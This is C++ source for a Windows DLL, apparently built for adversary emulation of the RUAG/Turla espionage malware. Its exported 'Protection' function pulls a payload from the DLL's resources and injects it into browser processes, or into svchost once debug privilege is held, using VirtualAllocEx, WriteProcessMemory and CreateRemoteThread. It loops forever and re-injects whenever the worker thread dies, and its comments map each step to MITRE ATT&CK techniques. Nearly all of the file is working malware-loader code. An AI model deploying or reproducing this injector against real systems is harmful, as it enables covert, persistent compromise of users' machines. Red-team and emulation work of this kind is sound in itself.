#include <windows.h>
#include <tlhelp32.h>
#include <stdbool.h>
#include <strsafe.h>
#include <iostream>
#include <cstdio>
#include "resource.h"
#include <thread>
#include <chrono>

// Get the HMODULE for the dll directly from the linker: https://devblogs.microsoft.com/oldnewthing/20041025-00/?p=37483
// This avoids mapping errors created when run from a hot process
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
#define HMOD_THISCOMPONENT ((HMODULE)&__ImageBase)

//DLLMain is pro forma only, all work is done in exported function to avoid race conditions: https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	HWND hwnd;
	HINSTANCE hinst;
	LPSTR lpszCmdLine;
	int nCmdShow;
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		//MessageBoxW(NULL, L"Process Attach", L"guard dll", MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2);
		// attach to process
		break;

	case DLL_PROCESS_DETACH:
		// detach from process
		break;

	case DLL_THREAD_ATTACH:
		// attach to thread
		break;

	case DLL_THREAD_DETACH:
		// detach from thread
		break;
	}
	return TRUE; //success
}


// Helper Function to check if the target process has debug permissions
// parameter(s): int pid - the PID of the target process (as seen in process hacker), 
//				PRIVILEGE_SET privs - the unique privilege set (including LUID) for SE_DEBUG
// return(s): bool debug - true if the target process is running with debug permissions, false otherwise
BOOL IsDebug(int pid, PRIVILEGE_SET privs) {
	BOOL debug = false;

	// References: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	// Open the target process w/PROCESS_QUERY_INFORMATION
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
	if (!hProcess) {
		int error = GetLastError();
		std::cerr << "OpenProcess ERROR: " << error << std::endl;
		return debug;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
	// Open the process token w/TOKEN_READ
	HANDLE hToken = NULL;
	OpenProcessToken(hProcess, TOKEN_READ, &hToken);
	if (!hToken) {
		int error = GetLastError();
		std::cerr << "OpenProcessToken ERROR: " << error << std::endl;
		return debug;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-privilegecheck
	// Using the passed in privilege set for SE_DEBUG, check if it's enabled on the token
	bool check = PrivilegeCheck(hToken, &privs, &debug);
	if (!check) {
		int error = GetLastError();
		std::cerr << "PrivilegeCheck ERROR: " << error << std::endl;
		return debug;
	}

	return debug;
}

// Helper Function to find the target process
// parameter(s): string procname - the name of the target process (as seen in process hacker)
//				PRIVILEGE_SET privs - the unique privilege set (including LUID) for SE_DEBUG
// return(s): int pid - the PID of the named process, or 0 if not found
int FindTarget(const char* procname, PRIVILEGE_SET privs) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	// References: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
	// Take a snapshot of all processes currently running
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	// Check that the snapshot is valid
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	// References: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
	//check that processes are accessible
	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	// References: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
	//			   https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lstrcmpia
	//			   https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid
	// Loop through the snapshot comparing process names until the target process is found
	// When the target process is found save its PID and break
	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			// If the current process is debug but the target is not, keep looking
			// Also check that the target does not have the same PID as the current process
			if (IsDebug(GetCurrentProcessId(), privs) && !IsDebug(pid, privs)) {
				std::cerr << "target " << pid << " found but not debug" << std::endl;
				continue;
			} else if (GetCurrentProcessId() == pid) {
				continue;
			} else {
				break;
			}
		}
	}

	CloseHandle(hProcSnap);

	//note that the pid will be of the FIRST matching process name
	return pid;
}

// Exported Guard function for injecting and monitoring the payload
extern "C" __declspec(dllexport) int Protection(HWND, HINSTANCE, LPSTR, int) {

	// UNCOMMENT FOR LOGGING
	// Set error output to go to a log file
	//freopen(R"(C:\Users\Public\guard_log.txt)", "w", stderr);
	//std::cerr << "Logging to file, current process is " << GetCurrentProcessId() << std::endl;

	//Create a privilege set containing SE_DEBUG to compare against
	LUID se_debug;
	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &se_debug)) {
		std::cerr << "priv lookup failed " << GetLastError() << std::endl;
	}
	PRIVILEGE_SET privs{};
	privs.Control = 0;
	privs.PrivilegeCount = 1;
	privs.Privilege[0].Luid = se_debug;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

//------------------------------------------------------------RESOURCE/PAYLOAD PREPARATION----------------------------------------------------------------------------------//
	// MITRE ATT&CK Techniques:
	//      T1027: Obfuscated Files or Information
	// Extract payload from resources section
	// Note that the hmodule passed in is the one retrieved from the linker via macros earlier
	// See README for how to add/remove resources
	HRSRC res = FindResourceW(HMOD_THISCOMPONENT, MAKEINTRESOURCEW(IDR_RES_BIN1), L"RES_BIN");
	if (!res) {
		int error = GetLastError();
		std::cerr << "FindResourceW ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}


	// Load the payload into memory and obtain a Handle to it
	HGLOBAL resHandle = LoadResource(HMOD_THISCOMPONENT, res);
	if (!resHandle) {
		int error = GetLastError();
		std::cerr << "LoadResource ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}


	// Convert the HGLOBAL Handle to a pointer to the first byte of payload data
	LPVOID payload = LockResource(resHandle);
	if (!payload) {
		int error = GetLastError();
		std::cerr << "LockResource ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}


	// Get the size (in bytes) of the payload
	DWORD payload_len = SizeofResource(HMOD_THISCOMPONENT, res);
	if (!payload_len) {
		int error = GetLastError();
		std::cerr << "SizeofResource ERROR: " << error << std::endl;
		return EXIT_FAILURE;
	}

//-----------------------------------------------------------------START OF INFINITE LOOP----------------------------------------------------------------------------------------------//
	//Arguments used in the loop
	int pid = 0; //pid of the remote process being targeted
	int error = 0; //last error code thrown by a win32 api
	bool worker = false; //boolian to track if the worker thread (payload) is active
	char target[20]; //name of the remote process being targeted
	DWORD thread_Id = 0;
	HANDLE hThread = NULL;
	HANDLE hProcess = NULL;



	// Infinite guard loop looking for the worker thread and injecting if it's not found
	while (true) {
		// If no worker thread exists then the guard will perform process injection to create one
		if (!worker) {
			/*
			CTI found here: https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf
			CTI Indicates that the worker was injected into internet enabled processes including but not limited to
			Internet Explorer, Firefox, MS Edge, and Mail, among others.
			*/
			// Loop over the list of potential targets, injecting into the first that is found
			const char* process_list[] = { "iexplore.exe", "msedge.exe", "firefox.exe", NULL };
			for (int i = 0; process_list[i] != NULL; i++) {
				//Check if the current process has debug permissions
				//This verifies if priv esc has been performed yet, and changes targets accordingly
				if (IsDebug(GetCurrentProcessId(), privs)) {
					strcpy_s(target, "svchost.exe");
					pid = FindTarget(target, privs);
				} else {
					strcpy_s(target, process_list[i]);
					// Get the pid of the target process (FindTarget helper detailed above)
					pid = FindTarget(target, privs);
				}
				// If the process could not be found, move on to the next in the list
				if (!pid) {
					continue;
				}


				// Open the target process w/necessary permissions to prepare for injection
				HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
					PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
				if (!hProcess) {
					int error = GetLastError();
					std::cerr << "OpenProcess " << pid << " ERROR: " << error << std::endl;
					return EXIT_FAILURE;
				}

                // MITRE ATT&CK Techniques:
                //      T1055.001: Process Injection: Dynamic-link Library Injection
				// Allocate some memory buffer in the target process for payload
				LPVOID exec_mem = VirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
				if (!exec_mem) {
					int error = GetLastError();
					std::cerr << "VirtualAllocEx ERROR: " << error << std::endl;
					return EXIT_FAILURE;
				}


				// Copy payload to new memory buffer
				DWORD procmem = WriteProcessMemory(hProcess, exec_mem, payload, payload_len, NULL);
				if (!procmem) {
					int error = GetLastError();
					std::cerr << "WriteProcessMemory ERROR: " << error << std::endl;
					return EXIT_FAILURE;
				}


				// Make the buffer executable
				DWORD oldprotect = 0;
				BOOL vprotect = VirtualProtectEx(hProcess, exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
				if (!vprotect) {
					int error = GetLastError();
					std::cerr << "VirtualProtectEx ERROR: " << error << std::endl;
					return EXIT_FAILURE;
				}


				// Launch the payload
				hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, &thread_Id);
				if (!hThread) {
					int error = GetLastError();
					std::cerr << "CreateRemoteThread ERROR: " << error << std::endl;
					return EXIT_FAILURE;
				}
				worker = true;
				break;
			}
		}

//--------------------------------------------------------------------CHECK WORKER STATUS---------------------------------------------------------------------------//
		// Wait for 5 seconds before checking status to avoid instant re-injection due to lag
		std::this_thread::sleep_for(std::chrono::milliseconds(5000));

		// Check to see if the injected worker thread is active
		DWORD exitCode;
		bool test;
		// Open the thread with the ID from CreateRemoteThread
		hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_Id);
		if (!hThread) {
			int error = GetLastError();
			std::cerr << "OpenThread ERROR: " << error << std::endl;
			return EXIT_FAILURE;
		}
		// Verify the exit code of the open thread
		test = GetExitCodeThread(hThread, &exitCode);

		// An exit code of 259 indicates success, all others are assumed to be failures
		// On failed exit codes worker thread is set to false, indicating the need for re-injection
		if (exitCode != 259) {
			worker = false;
		}
//---------------------------------------------------------------CONTROL FLOW BACK TO LOOP-----------------------------------------------------------------------//
	}
	// Only occurs if the loop ends
	return 0;
}
